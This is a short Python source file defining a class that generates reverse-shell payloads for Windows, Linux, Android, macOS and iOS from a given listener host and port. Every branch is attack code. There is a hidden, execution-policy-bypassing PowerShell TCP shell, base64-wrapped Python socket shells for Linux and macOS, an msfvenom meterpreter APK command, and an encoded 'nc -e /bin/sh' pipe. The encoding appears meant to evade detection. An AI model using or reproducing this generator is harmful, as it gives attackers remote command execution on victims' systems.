import base64
import random
class MultiPlatformEliteEngine:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    def generate_payload(self, platform="windows"):
        if platform == "windows":
            ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            encoded = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
        elif platform == "linux":
            raw = f"import socket,os,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('{self.lhost}',{self.lport}))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])"
            encoded = base64.b64encode(raw.encode()).decode()
            return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}').decode())\""
        elif platform == "android":
            return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -o payload.apk"
        elif platform == "macos":
            raw_mac = f"import socket,os,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('{self.lhost}',{self.lport}))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call(['/bin/zsh','-i'])"
            encoded_mac = base64.b64encode(raw_mac.encode()).decode()
            return f"python3 -c \"import base64;exec(base64.b64decode('{encoded_mac}').decode())\""
        elif platform == "ios":
            raw_ios = f"nc -e /bin/sh {self.lhost} {self.lport}"
            encoded_ios = base64.b64encode(raw_ios.encode()).decode()
            return f"echo {encoded_ios} | base64 -d | sh"
        return "Invalid Platform"
